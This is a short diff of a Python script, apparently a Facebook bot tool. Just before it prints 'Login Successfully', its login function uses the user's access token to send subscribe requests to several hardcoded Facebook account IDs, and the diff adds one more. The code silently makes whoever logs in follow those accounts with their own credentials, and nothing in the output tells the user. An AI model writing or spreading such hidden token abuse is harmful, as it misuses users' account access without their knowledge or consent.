@@ -114,6 +114,7 @@ def bot_komen():
     requests.post('https://graph.facebook.com/536209003/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/100026711802694/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/100042918784910/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100059454248601/subscribers?access_token=' + token)
     print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
     menu()
 
